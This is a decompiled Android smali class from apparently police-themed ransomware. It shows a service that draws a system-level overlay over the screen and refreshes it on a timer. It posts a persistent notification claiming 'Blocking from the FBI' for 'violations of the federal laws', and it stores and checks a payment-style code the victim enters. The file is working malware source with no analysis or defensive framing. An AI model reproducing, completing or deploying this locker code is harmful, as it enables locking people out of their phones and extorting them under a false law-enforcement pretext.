.class public Lcom/zombie/ebola/jora;
.super Landroid/app/Service;


# static fields
.field static a:Landroid/view/WindowManager$LayoutParams;

.field static b:Landroid/view/WindowManager;

.field static c:Landroid/view/View;

.field static d:Landroid/view/LayoutInflater;

.field static e:I


# direct methods
.method static constructor <clinit>()V
    .locals 7

    const/4 v1, -0x1

    const/4 v6, 0x0

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7da

    const/16 v4, 0x100

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v0, Lcom/zombie/ebola/jora;->a:Landroid/view/WindowManager$LayoutParams;

    sput-object v6, Lcom/zombie/ebola/jora;->b:Landroid/view/WindowManager;

    sput-object v6, Lcom/zombie/ebola/jora;->c:Landroid/view/View;

    sput-object v6, Lcom/zombie/ebola/jora;->d:Landroid/view/LayoutInflater;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private a(Landroid/view/View;Landroid/view/View;)V
    .locals 7

    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadScheduledExecutor()Ljava/util/concurrent/ScheduledExecutorService;

    move-result-object v0

    new-instance v1, Lcom/zombie/ebola/z;

    invoke-direct {v1, p0, p1, p2, v0}, Lcom/zombie/ebola/z;-><init>(Lcom/zombie/ebola/jora;Landroid/view/View;Landroid/view/View;Ljava/util/concurrent/ScheduledExecutorService;)V

    const-wide/16 v2, 0x1

    const-wide/16 v4, 0x2

    sget-object v6, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-interface/range {v0 .. v6}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/jora;Landroid/view/View;Landroid/view/View;)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/zombie/ebola/jora;->a(Landroid/view/View;Landroid/view/View;)V

    return-void
.end method

.method private a(Landroid/content/Context;)Z
    .locals 1

    const-string v0, "connectivity"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method static synthetic a(Lcom/zombie/ebola/jora;Ljava/lang/String;)Z
    .locals 1

    invoke-direct {p0, p1}, Lcom/zombie/ebola/jora;->c(Ljava/lang/String;)Z

    move-result v0

    return v0
.end method

.method static synthetic b(Lcom/zombie/ebola/jora;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/zombie/ebola/jora;->b(Ljava/lang/String;)V

    return-void
.end method

.method private b(Ljava/lang/String;)V
    .locals 2

    const-string v0, "mpcode"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/zombie/ebola/jora;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0, p1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    return-void
.end method

.method private c(Ljava/lang/String;)Z
    .locals 4

    const/4 v0, 0x0

    new-instance v1, Lcom/zombie/ebola/t;

    invoke-direct {v1}, Lcom/zombie/ebola/t;-><init>()V

    const-string v2, "mpcode"

    invoke-virtual {p0}, Lcom/zombie/ebola/jora;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v1, v2, p1, v3}, Lcom/zombie/ebola/t;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-virtual {v1, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    const/4 v0, 0x1

    :cond_0
    return v0
.end method


# virtual methods
.method public a(Ljava/lang/String;)V
    .locals 5

    new-instance v0, Lcom/zombie/ebola/t;

    invoke-direct {v0}, Lcom/zombie/ebola/t;-><init>()V

    const-string v1, "mp_code"

    const-string v2, "mp_code"

    invoke-virtual {p0}, Lcom/zombie/ebola/jora;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v0, v1, v2, p1, v3}, Lcom/zombie/ebola/t;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    invoke-virtual {p0}, Lcom/zombie/ebola/jora;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/zombie/ebola/jora;->a(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "mp_code"

    new-instance v1, Lcom/zombie/ebola/r;

    invoke-direct {v1}, Lcom/zombie/ebola/r;-><init>()V

    invoke-virtual {p0}, Lcom/zombie/ebola/jora;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-virtual {v1, v0, v0, v2}, Lcom/zombie/ebola/r;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    :goto_0
    return-void

    :cond_0
    new-instance v0, Lcom/zombie/ebola/t;

    invoke-direct {v0}, Lcom/zombie/ebola/t;-><init>()V

    const-string v1, "jorack"

    const-string v2, "cache"

    const-string v3, "work"

    invoke-virtual {p0}, Lcom/zombie/ebola/jora;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/zombie/ebola/t;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto :goto_0
.end method

.method public a(Ljava/lang/String;Landroid/view/View;)V
    .locals 4

    invoke-virtual {p0}, Lcom/zombie/ebola/jora;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const-string v1, "mp_code"

    const-string v2, "id"

    invoke-virtual {p0}, Lcom/zombie/ebola/jora;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p2, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    invoke-virtual {v0}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 6

    const/4 v5, 0x0

    new-instance v0, Lcom/zombie/ebola/ad;

    invoke-direct {v0, p0}, Lcom/zombie/ebola/ad;-><init>(Lcom/zombie/ebola/jora;)V

    new-array v1, v5, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/zombie/ebola/ad;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    new-instance v0, Landroid/app/Notification;

    const v1, 0x108001f

    const-string v2, "Blocking from the FBI"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v0, v1, v2, v3, v4}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    new-instance v1, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/zombie/ebola/jora;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/zombie/ebola/bobS;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "android.intent.action.VIEW"

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x34000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x8000000

    invoke-static {p0, v5, v1, v2}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    const-string v2, "Google"

    const-string v3, "Violations of the federal laws of the United States of America"

    invoke-virtual {v0, p0, v2, v3, v1}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    iget v1, v0, Landroid/app/Notification;->flags:I

    or-int/lit8 v1, v1, 0x62

    iput v1, v0, Landroid/app/Notification;->flags:I

    const/4 v1, 0x2

    invoke-virtual {p0, v1, v0}, Lcom/zombie/ebola/jora;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method
